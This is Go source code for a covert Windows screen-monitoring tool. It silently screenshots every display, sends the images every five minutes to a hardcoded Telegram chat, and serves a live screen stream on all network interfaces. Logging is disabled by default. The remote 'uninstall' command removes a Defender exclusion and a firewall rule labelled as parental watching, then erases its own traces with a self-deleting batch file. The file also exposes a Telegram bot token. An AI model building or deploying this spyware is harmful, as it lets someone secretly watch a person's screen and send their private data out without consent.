package main

import (
    "bytes"
    "fmt"
    "image"
    "image/jpeg"
    "io"
    "log"
    "net"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strconv"
    "strings"
    "sync"
    "time"

    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
    "github.com/kbinani/screenshot"
)

var (
    botToken   = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
    allowedIDs = []int64{7208529004}
    port       = "5000"
    logFile    = ""
    mutex      sync.Mutex
    running    = true
    destFolder = filepath.Join(os.Getenv("USERPROFILE"), "Downloads", "secfnx")
    logEnabled = false // Default to false
)

func init() {
    // Set log file to %TEMP%\monitor_bot.log
    logFile = filepath.Join(os.Getenv("TEMP"), "monitor_bot.log")
    if logEnabled {
        f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
        if err != nil {
            fmt.Println("Failed to open log file:", err)
            return
        }
        log.SetOutput(f)
    } else {
        log.SetOutput(io.Discard)
    }
}

func logRotate() {
    if !logEnabled {
        return
    }
    mutex.Lock()
    defer mutex.Unlock()
    if info, err := os.Stat(logFile); err == nil && info.Size() > 10*1024*1024 {
        backup := fmt.Sprintf("%s.%s.bak", logFile, time.Now().Format("20060102150405"))
        os.Rename(logFile, backup)
        f, err := os.Create(logFile)
        if err != nil {
            log.Println("ERROR - Failed to create new log file:", err)
            return
        }
        log.SetOutput(f)
        f.Close()
    }
}

func captureScreen() (*image.RGBA, error) {
    n := screenshot.NumActiveDisplays()
    if n == 0 {
        return nil, fmt.Errorf("no active displays")
    }

    if n == 1 {
        bounds := screenshot.GetDisplayBounds(0)
        return screenshot.CaptureRect(bounds)
    }

    // Multiple screens: combine into one image
    var totalWidth, maxHeight int
    boundsList := make([]image.Rectangle, n)
    for i := 0; i < n; i++ {
        bounds := screenshot.GetDisplayBounds(i)
        boundsList[i] = bounds
        totalWidth += bounds.Dx()
        if bounds.Dy() > maxHeight {
            maxHeight = bounds.Dy()
        }
    }

    combined := image.NewRGBA(image.Rect(0, 0, totalWidth, maxHeight))
    offsetX := 0
    for i := 0; i < n; i++ {
        img, err := screenshot.CaptureRect(boundsList[i])
        if err != nil {
            return nil, err
        }
        for y := 0; y < img.Bounds().Dy(); y++ {
            for x := 0; x < img.Bounds().Dx(); x++ {
                combined.Set(x+offsetX, y, img.At(x, y))
            }
        }
        offsetX += img.Bounds().Dx()
    }
    return combined, nil
}

func sendToTelegram(bot *tgbotapi.BotAPI, img *image.RGBA) error {
    buf := new(bytes.Buffer)
    if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
        return err
    }

    for _, chatID := range allowedIDs {
        photo := tgbotapi.NewPhoto(chatID, tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: buf.Bytes()})
        if _, err := bot.Send(photo); err != nil {
            if logEnabled {
                log.Println("ERROR - Telegram send to", chatID, ":", err)
            }
        } else {
            if logEnabled {
                log.Println("INFO - Sent screenshot to", chatID)
            }
        }
    }
    return nil
}

func checkPort(port string) bool {
    ln, err := net.Listen("tcp", ":"+port)
    if err != nil {
        return false
    }
    ln.Close()
    return true
}

func startMJPEGServer() {
    for i := 0; i < 10; i++ {
        if checkPort(port) {
            break
        }
        p, err := strconv.Atoi(port)
        if err != nil {
            if logEnabled {
                log.Println("ERROR - Failed to parse port:", err)
            }
            return
        }
        p += 100
        port = strconv.Itoa(p)
        if logEnabled {
            log.Println("INFO - Port", port, "in use, trying", p)
        }
    }

    http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
        w.Header().Set("Pragma", "no-cache")
        w.Header().Set("Expires", "0")

        for running {
            img, err := captureScreen()
            if err != nil {
                if logEnabled {
                    log.Println("ERROR - MJPEG capture:", err)
                }
                continue
            }
            buf := new(bytes.Buffer)
            if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
                if logEnabled {
                    log.Println("ERROR - MJPEG encode:", err)
                }
                continue
            }
            _, err = w.Write([]byte("--frame\r\nContent-Type: image/jpeg\r\n\r\n"))
            if err != nil {
                return
            }
            _, err = w.Write(buf.Bytes())
            if err != nil {
                return
            }
            _, err = w.Write([]byte("\r\n"))
            if err != nil {
                return
            }
            time.Sleep(100 * time.Millisecond)
        }
    })

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "text/html")
        w.Write([]byte(`
            <html>
            <head>
                <title>Screen Preview</title>
                <style>
                    img { max-width: 100%; height: auto; }
                    body { margin: 0; padding: 10px; background: #000; }
                </style>
            </head>
            <body>
                <img src="/stream" alt="Live Screen Preview">
            </body>
            </html>
        `))
    })

    if logEnabled {
        log.Println("INFO - Starting MJPEG server on localhost:" + port)
    }
    go http.ListenAndServe(":"+port, nil)
}

func uninstall() {
    if logEnabled {
        log.Println("INFO - Starting uninstall process")
    }
    running = false

    // Delay to allow MJPEG server and Telegram bot to stop gracefully
    if logEnabled {
        log.Println("DEBUG - Waiting 5 seconds for graceful shutdown")
    }
    time.Sleep(5 * time.Second)

    // Remove Go
    goInstallDir := "C:\\Program Files\\Go"
    if _, err := os.Stat(goInstallDir); err == nil {
        if logEnabled {
            log.Println("DEBUG - Attempting to uninstall Go")
        }
        // Use wmic to find the Go 1.24.7 product code
        cmd := exec.Command("wmic", "product", "where", "name like 'Go Programming Language%'", "get", "IdentifyingNumber")
        output, err := cmd.CombinedOutput()
        if err != nil {
            if logEnabled {
                log.Println("ERROR - Failed to get Go product code:", err)
            }
            // Fallback to hardcoded product code for Go 1.24.7
            cmd = exec.Command("msiexec.exe", "/x", "{2A8F1E0B-CEFD-4B63-BE7B-EE672BFE23D9}", "/qn")
            if err := cmd.Run(); err != nil {
                if logEnabled {
                    log.Println("ERROR - Failed to uninstall Go with fallback product code:", err)
                }
            } else {
                if logEnabled {
                    log.Println("INFO - Go uninstalled successfully with fallback product code")
                }
            }
        } else {
            productCode := string(output)
            productCode = strings.TrimSpace(strings.Replace(productCode, "IdentifyingNumber", "", -1))
            if productCode != "" {
                cmd = exec.Command("msiexec.exe", "/x", productCode, "/qn")
                if err := cmd.Run(); err != nil {
                    if logEnabled {
                        log.Println("ERROR - Failed to uninstall Go:", err)
                    }
                } else {
                    if logEnabled {
                        log.Println("INFO - Go uninstalled successfully")
                    }
                }
            } else {
                if logEnabled {
                    log.Println("ERROR - No Go product code found")
                }
            }
        }
    } else {
        if logEnabled {
            log.Println("DEBUG - Go not found at", goInstallDir)
        }
    }

    // Read path_sec.log and delete listed files/folders
    pathLog := filepath.Join(destFolder, "path_sec.log")
    if _, err := os.Stat(pathLog); err == nil {
        if logEnabled {
            log.Println("DEBUG - Reading path_sec.log to delete listed paths")
        }
        content, err := os.ReadFile(pathLog)
        if err != nil {
            if logEnabled {
                log.Println("ERROR - Failed to read path_sec.log:", err)
            }
        } else {
            lines := strings.Split(string(content), "\n")
            for _, line := range lines {
                // Extract path after ": "
                parts := strings.SplitN(line, ": ", 2)
                if len(parts) == 2 {
                    path := strings.TrimSpace(parts[1])
                    if _, err := os.Stat(path); err == nil {
                        if logEnabled {
                            log.Println("DEBUG - Deleting path from path_sec.log:", path)
                        }
                        if err := os.RemoveAll(path); err != nil {
                            if logEnabled {
                                log.Println("ERROR - Failed to delete path", path, ":", err)
                            }
                        } else {
                            if logEnabled {
                                log.Println("INFO - Deleted path", path)
                            }
                        }
                    }
                }
            }
        }
    } else {
        if logEnabled {
            log.Println("DEBUG - path_sec.log not found, skipping")
        }
    }

    // Delete all files in secfnx folder
    if _, err := os.Stat(destFolder); err == nil {
        if logEnabled {
            log.Println("DEBUG - Deleting all files in", destFolder)
        }
        err = filepath.Walk(destFolder, func(path string, info os.FileInfo, err error) error {
            if err != nil {
                return err
            }
            if path != destFolder {
                if logEnabled {
                    log.Println("DEBUG - Deleting", path)
                }
                if err := os.RemoveAll(path); err != nil {
                    if logEnabled {
                        log.Println("ERROR - Failed to delete", path, ":", err)
                    }
                } else {
                    if logEnabled {
                        log.Println("INFO - Deleted", path)
                    }
                }
            }
            return nil
        })
        if err != nil {
            if logEnabled {
                log.Println("ERROR - Failed to walk directory", destFolder, ":", err)
            }
        }
    } else {
        if logEnabled {
            log.Println("DEBUG - Directory", destFolder, "not found, skipping")
        }
    }

    // Remove environment variables
    if logEnabled {
        log.Println("DEBUG - Removing PATH entry")
    }
    cmd := exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('Path', [Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine).Replace(';C:\\Program Files\\Go\\bin', ''), [System.EnvironmentVariableTarget]::Machine)")
    if err := cmd.Run(); err != nil {
        if logEnabled {
            log.Println("ERROR - Failed to remove PATH:", err)
        }
    } else {
        if logEnabled {
            log.Println("INFO - Removed Go from PATH")
        }
    }

    if logEnabled {
        log.Println("DEBUG - Removing GOROOT")
    }
    cmd = exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('GOROOT', '', [System.EnvironmentVariableTarget]::Machine)")
    if err := cmd.Run(); err != nil {
        if logEnabled {
            log.Println("ERROR - Failed to remove GOROOT:", err)
        }
    } else {
        if logEnabled {
            log.Println("INFO - Removed GOROOT")
        }
    }

    // Remove Defender exclusion
    if logEnabled {
        log.Println("DEBUG - Removing Defender exclusion")
    }
    cmd = exec.Command("powershell", "-Command", "Remove-MpPreference -ExclusionPath '" + destFolder + "' -ErrorAction SilentlyContinue")
    if err := cmd.Run(); err != nil {
        if logEnabled {
            log.Println("ERROR - Failed to remove Defender exclusion:", err)
        }
    } else {
        if logEnabled {
            log.Println("INFO - Removed Defender exclusion")
        }
    }

    // Remove Firewall rule with elevated privileges
    if logEnabled {
        log.Println("DEBUG - Removing firewall rule")
    }
    cmd = exec.Command("powershell", "-Command", "Start-Process powershell -Verb RunAs -ArgumentList \"Remove-NetFirewallRule -DisplayName 'Allow ParentalWatching Go Apps' -ErrorAction SilentlyContinue\" -Wait")
    if err := cmd.Run(); err != nil {
        if logEnabled {
            log.Println("ERROR - Failed to remove firewall rule:", err)
        }
    } else {
        if logEnabled {
            log.Println("INFO - Removed firewall rule")
        }
    }

    // Create batch file for final cleanup
    tempDir := os.Getenv("TEMP")
    batchPath := filepath.Join(tempDir, "uninstall.bat")
    batchContent := fmt.Sprintf(`@echo off
taskkill /PID %d /F >nul 2>&1
timeout /t 5 /nobreak >nul
rmdir /s /q "%s" >nul 2>&1
del /q "%s" >nul 2>&1
taskkill /IM cmd.exe /F >nul 2>&1
taskkill /IM powershell.exe /F >nul 2>&1
exit
`, os.Getpid(), destFolder, batchPath)
    if err := os.WriteFile(batchPath, []byte(batchContent), 0644); err != nil {
        if logEnabled {
            log.Println("ERROR - Failed to create batch file:", err)
        }
    } else {
        if logEnabled {
            log.Println("INFO - Created batch file for cleanup:", batchPath)
        }
        cmd = exec.Command("cmd", "/C", "start", batchPath)
        if err := cmd.Start(); err != nil {
            if logEnabled {
                log.Println("ERROR - Failed to start batch file:", err)
            }
        } else {
            if logEnabled {
                log.Println("INFO - Started batch cleanup")
            }
        }
    }

    if logEnabled {
        log.Println("INFO - Uninstallation complete, batch file handling final cleanup")
    }
    time.Sleep(2 * time.Second)
    os.Exit(0)
}

func main() {
    if logEnabled {
        log.Println("INFO - Bot starting")
    }
    bot, err := tgbotapi.NewBotAPI(botToken)
    if err != nil {
        if logEnabled {
            log.Fatalf("ERROR - Failed to initialize bot: %v", err)
        } else {
            os.Exit(1)
        }
    }

    startMJPEGServer()

    go func() {
        for running {
            logRotate()
            img, err := captureScreen()
            if err != nil {
                if logEnabled {
                    log.Println("ERROR - Capture:", err)
                }
            } else {
                if err := sendToTelegram(bot, img); err != nil {
                    if logEnabled {
                        log.Println("ERROR - Telegram:", err)
                    }
                }
            }
            time.Sleep(300 * time.Second)
        }
    }()

    u := tgbotapi.NewUpdate(0)
    u.Timeout = 60
    updates := bot.GetUpdatesChan(u)

    for update := range updates {
        if update.Message == nil || update.Message.Chat == nil {
            continue
        }

        chatID := update.Message.Chat.ID
        allowed := false
        for _, id := range allowedIDs {
            if chatID == id {
                allowed = true
                break
            }
        }
        if !allowed {
            if logEnabled {
                log.Println("INFO - Unauthorized user:", chatID)
            }
            continue
        }

        if update.Message.IsCommand() {
            switch update.Message.Command() {
            case "screenshot":
                img, err := captureScreen()
                if err != nil {
                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to capture screenshot: "+err.Error()))
                    if logEnabled {
                        log.Println("ERROR - /screenshot:", err)
                    }
                    continue
                }
                if err := sendToTelegram(bot, img); err != nil {
                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to send screenshot: "+err.Error()))
                    if logEnabled {
                        log.Println("ERROR - /screenshot send:", err)
                    }
                }
            case "uninstall":
                bot.Send(tgbotapi.NewMessage(chatID, "Uninstalling..."))
                uninstall()
            }
        }
    }
}
